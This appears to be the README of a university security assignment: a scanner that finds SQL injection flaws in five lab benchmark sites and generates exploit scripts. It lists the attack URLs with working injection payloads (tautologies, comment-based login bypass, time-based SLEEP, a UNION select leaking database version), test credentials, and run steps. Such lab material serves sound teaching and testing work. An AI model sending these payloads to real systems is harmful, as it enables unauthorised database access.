
----------------------------------------------------------------------------------------------------------
Tools that need to be installed:
1) Beautifulsoup -> pip install beautifulsoup
2) Selenium 
3) chardet -> pip install chardet

----------------------------------------------------------------------------------------------------------
BenchMark Information:
1) BenchMark1 :
privileges : "regular"
Login UserName : admin@admin.com
Password: “admin”
Login URL : "https://bm1.com/bm1/login.php"
Attack URL : "https://bm1.com/bm1/insertData.php?orderName=1%27+or+%271%3D1&quantity=1"
	      “http://bm1.com/bm1/insertData.php?orderName=%27+or+%271%3D1%27+%23&quantity=“
 “http://bm1.com/bm1/insertData.php?orderName=%27+and+SLEEP%2810%29+%23&quantity=“

2) BenchMark2 :
privileges : "regular"
Login UserName : “admin@admin.com”
Password: “admin”
Login URL : "https://bm2.com/bm2/login.php"
Attack URL : "https://bm2.com/bm2/viewOrder.php?username=admin&id=1%27+or+%271%3D1"
		http://bm2.com/bm2/viewOrder.php?username=%27%23&id=
		http://bm2.com/bm2/viewOrder.php?username=&id=%27+or+%271%3D1%27+%23
		http://bm2.com/bm2/viewOrder.php?username=&id=%27+and+SLEEP%2810%29+%23
		http://bm2.com/bm2/viewOrder.php?username=%27+or+%271%3D1%27+%23&id=
		http://bm2.com/bm2/viewOrder.php?username=%27+and+SLEEP%2810%29+%23&id=

3) BenchMark 3: 
Login URL: "http://bm3.com/bm3.php"
Valid Credentials: 
		"username": "admin",
		"password": “cannotguess”,
Attack URL : "http://bm3.com/bm3.php"
Attack Credentials : 
	username : "admin’#”
	password : “dummy”

4) BenchMark 4:
Attack URL: "https://bm4.com/bm4.php?id=1%27+or+%271%3D1"

5) BenchMark 5:
Attack URL : "https://bm5.com/bm5.php?search=1%27+or+%271%3D1"

----------------------------------------------------------------------------------------------------------
Point to Consider:
1) Some urls can be attacked by multiple payloads. It may be possible that the exact attack specified in the given benchmark does not show in our results. This is to reduce the number of attacks on the same url to prevent time. 
Please consider the url and not the exact combination provided in the benchmark. This should still be considered as a successful attack.

2) Same attack may happen with different parameters for the same url. For eg. https://app4.com/admin/severity.php?op=edit&severity_id=1%27+and+1=2+union+select+1,user%28%29,database%28%29,version%28%29,5++ would give the same attack output as it would with passing severity_id = 2



----------------------------------------------------------------------------------------------------------
Hash of VM with Benchmarks (CS5331-A3.vdi): 27C20B1C179A924BD1846BD18B212352
Hash of VM with Scanner (CS5331-A2.vdi): 42E247BF1C8EB60C90A2AA7D0A906733

----------------------------------------------------------------------------------------------------------

How to Run:
1) Please enter the URLs in file 'input.json' present inside the folder - Assignment3/dirbot/spiders/ Please follow the format specified in it. loginurl is the url to login and the key of the dictionary is the url after login. 
“after_login_url” : [{
	“loginurl”: … ,
	“params” : 
	[{
		“account credentials”
	}]
}]

2) Execute the command: python -c 'import Main; print Main.m1();'
3) The scripts generated (sh and py file) after execution will be stored inside exploitScripts folder -> location is  Assignment3/dirbot/spiders/exploitScripts/
	

Please start the Benchmark VM first because IP address for this one is 101 in the /etc/hosts/ file. Otherwise please change it.
The output of 1st phase is data.json and datalogin.json. 
The payloads for the 2nd phase are in step2.json
The output of 3rd phase will be stored in step3op.json and step3loginop.json
The final scripts of 4th phase will be stored in folder exploitScripts.
The corresponding information related to attack URL and the corresponding attack script is stored in attackURLnFile.txt
Please delete the folder exploitScripts to remove the previous scripts and clear the file attackURLnFile.txt otherwise it will append new file information to that.



